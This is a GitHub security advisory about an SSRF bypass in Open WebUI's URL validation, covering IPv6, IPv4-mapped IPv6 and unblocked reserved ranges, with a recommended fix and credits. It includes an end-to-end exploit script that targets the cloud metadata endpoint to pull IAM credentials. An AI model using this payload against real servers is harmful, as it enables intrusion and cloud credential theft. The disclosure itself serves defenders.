# [H] Open WebUI has a full SSRF Vulnerability in the RAG Web Search Feature

## Summary
Severity: High
Advisory: GHSA-4v7r-f4w8-8972
CVE: CVE-2026-45331
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-4v7r-f4w8-8972
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.0

## Details
# SSRF Bypass via IPv6/IPv4-mapped IPv6/IPv4-reserved-ranges in `validate_url()`

## Summary

`validate_url()` in `backend/open_webui/retrieval/web/utils.py` calls `validators.ipv6(ip, private=True)`, but the `validators` library does NOT implement the `private` keyword for IPv6 — the call raises a `ValidationError` (which is falsy in a boolean context), so every IPv6 address passes the filter. In addition, IPv4-mapped IPv6 (`::ffff:10.0.0.1`) bypasses the IPv4 check entirely, and several reserved IPv4 ranges (`0.0.0.0/8`, `100.64.0.0/10`, `192.0.0.0/24`, etc.) are not blocked.

The vulnerability has existed since the `validate_url()` function was introduced and was NOT actually fixed by GHSA-c6xv-rcvw-v685 / CVE-2025-65958 despite that patch's intent. It affects every endpoint that calls `validate_url()`, including `/api/v1/retrieval/process/web`, `/api/v1/images/edit`, and others.

## Affected code

`backend/open_webui/retrieval/web/utils.py validate_url()`:

```python
if validators.ipv6(ip, private=True):  # ValidationError is falsy — never raises
    raise ValueError(...)
```

## Proof of concept

```python
import validators
print(validators.ipv6("::1", private=True))
# ValidationError(func=ipv6, args={'reason': "ipv6() got an unexpected keyword argument 'private'", ...})
```

End-to-end exploit:

```python
import requests, ipaddress

OPEN_WEBUI_URL = "https://target"
TOKEN = "..."
TARGET_IPV4 = "169.254.169.254"   # AWS IMDSv1
mapped = "::ffff:" + TARGET_IPV4

requests.post(f"{OPEN_WEBUI_URL}/api/v1/retrieval/process/web",
              headers={"Authorization": f"Bearer {TOKEN}"},
              json={"collection_name": "", "url": f"http://[{mapped}]/latest/meta-data/iam/security-credentials/"})
```

## Impact

Any authenticated user can reach any internal IPv4/IPv6 address from the server process — cloud metadata, localhost-bound APIs, internal services. IMDSv1 reachability leads to IAM credential exfiltration.

## Recommended fix

Replace the `validators` library calls with stdlib `ipaddress`:

```python
import ipaddress
addr = ipaddress.ip_address(ip)
if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_multicast or addr.is_reserved or addr.is_unspecified:
    raise ValueError(...)
# also unwrap IPv4-mapped IPv6 and re-check:
if isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped:
    addr_v4 = addr.ipv4_mapped
    if addr_v4.is_private or addr_v4.is_loopback or ...:
        raise ValueError(...)
# plus explicit blocks for IANA reserved ranges (0.0.0.0/8, 100.64.0.0/10, etc. — see body for full list).
```

## Related but separate advisories

- Redirect-bypass cluster: GHSA-rh5x-h6pp-cjj6
- DNS rebinding TOCTOU: GHSA-h6x2-583h-x99r
- urlparse / requests parsing-differential: GHSA-8w7q-q5jp-jvgx
- Playwright loader redirect: GHSA-jrfp-m64g-pcwv
- Missing `validate_url()` call in image_generations: GHSA-h7cc-wwjp-5xqh

## Credits

- **Dor Konis (dkonis, GE Vernova)** — first to identify the `validators.ipv6(private=True)` silent-fail and IPv4-mapped IPv6 bypass; GHSA-4v7r-f4w8-8972 (this filing, 2024-09-11; credit explicitly requested in original report).
- **wlayzz** — first to identify the unblocked IPv4 reserved ranges (0.0.0.0/8, 100.64.0.0/10, 192.0.2.0/24, 198.18.0.0/15, 203.0.113.0/24, etc.); GHSA-pxgj-3gvh-mfjv.

Subsequent filings (GHSA-mggf-94hh-vp4w by vnth4nhnt, GHSA-xhgr-g5q7-jg6p by L1M1T-HACK) re-described the same root cause on the same or different endpoints and were closed as duplicates without advisory credit — fixing `validate_url()` once resolves all of them.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-4v7r-f4w8-8972
- https://nvd.nist.gov/vuln/detail/CVE-2026-45331
- https://github.com/advisories/GHSA-c6xv-rcvw-v685
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.0
